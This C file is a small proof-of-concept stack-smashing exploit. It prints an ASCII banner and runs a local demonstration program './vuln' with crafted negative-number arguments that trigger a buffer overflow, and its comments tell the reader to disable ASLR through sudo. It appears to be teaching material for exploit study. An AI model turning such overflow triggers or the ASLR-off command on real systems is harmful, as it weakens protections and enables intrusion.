/*
 * Smash the stack exploit.
 * (C) 2016 nighter 
 * 
 * pOc how to exploit a buffer overflow bug on x86.
 * 
 * Compile with
 *    gcc ./exploit.c -m32 -w -o exploit
 * 
 * Be sure ASLR is turned off.
 *    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
 *
 * If you rather use the command line injection.
 *
 *   ./vuln -4294967295 -1
 */

#include <stdio.h>

void banner()
{
   printf("      ▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄\n");
   printf("     █░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄\n");
   printf("    █░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█\n");
   printf("   █░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█\n");
   printf(" ▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█\n");
   printf("█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█\n");
   printf("█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█\n");
   printf(" █░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█\n");
   printf("  █░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█\n");
   printf("   █░░░░██░░▀█▄▄▄█▄▄█▄████░█\n");
   printf("    █░░░░▀▀▄░█░░░█░█▀██████░█\n");
   printf("     ▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█\n");
   printf("       ▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█\n");
   printf("          ▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█\n");
   printf("              ▀▄▄▄▄▄░░░░░░░░█\n");
   printf("\np0c by %s[%s]\n\n","nighter","https://nighter.se");
}

int main(int argc, char **argv)
{
    banner();
    execl("./vuln", "vuln" , "-4294967295", "-1", NULL);
    return 0;
}
